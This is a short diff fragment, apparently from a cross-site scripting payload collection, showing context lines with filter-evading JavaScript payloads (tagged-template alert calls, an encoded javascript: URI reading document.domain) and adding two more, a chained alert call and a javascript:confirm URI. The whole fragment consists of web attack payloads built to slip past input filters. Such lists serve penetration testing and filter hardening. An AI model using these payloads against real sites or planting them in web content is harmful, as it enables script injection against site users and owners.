@@ -246,3 +246,5 @@ Set.constructor`alert\x28document.domain\x29```
 o={1.e+1111(){alert(arguments.callee);}};o[1e1111]()//
 prompt`${document.domain}`
 javascr%0d%0aipt%3Aalert.call(this,%20document.domain)
+alert(1)('lol','lol')('lol','lol')('lol','lol')('lol','lol').x.y.LOL()
+javascript:confirm(7)//://svg
